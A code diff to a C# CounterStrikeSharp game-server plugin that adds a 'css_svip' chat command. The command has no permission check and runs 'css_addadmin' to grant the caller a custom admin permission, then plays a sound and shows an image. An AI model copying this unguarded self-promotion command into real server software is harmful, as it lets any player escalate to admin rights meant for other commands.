@@ -7,10 +7,39 @@ using CounterStrikeSharp.API.Modules.Commands;
 
 
 
+
 namespace Frozen_Elsa;
 
 public partial class Frozen_Elsa
 {
+
+    [ConsoleCommand("css_svip", "svip")]// !dc
+    public void OnCommandGiveSVIP(CCSPlayerController? player, CommandInfo commandInfo)
+    {
+        if (player == null) return;
+        if (!player.IsValid) return;
+
+
+        var callerName = player == null ? "Console" : player.PlayerName;
+
+                            var steamId = player?.AuthorizedSteamID?.SteamId64;
+                            if (!HasPermission(player, "Permission"))
+                            { 
+                                Server.ExecuteCommand($"css_addadmin {steamId} {callerName} @css/custom-permission 40 40000");
+                                player?.PrintToChat($"ADD VIP {callerName} @css/custom-permission 40 40000");
+                                }else {player?.PrintToChat($"o Usuario {callerName} ja tem @css/custom-permission 40 40000");return;} 
+                            
+        
+        player?.ExecuteClientCommand($"play sounds/frozen_music2/frozen-ice.vsnd_c");
+
+        Globals.SiteImage = "https://raw.githubusercontent.com/oqyh/cs2-MVP-Sounds-GoldKingZ/def5df4f333fc95da1e6de92a5c137fa5006ebad/Resources/9mm.gif";
+        RegisterListener<Listeners.OnTick>(OnTick);
+        shouldShowImage = true;
+        AddTimer(7, () =>
+        {
+            shouldShowImage = false;
+        });
+    }
 
     [ConsoleCommand("css_dc", "dc")]// !dc
     [RequiresPermissions("@css/custom-permission")]
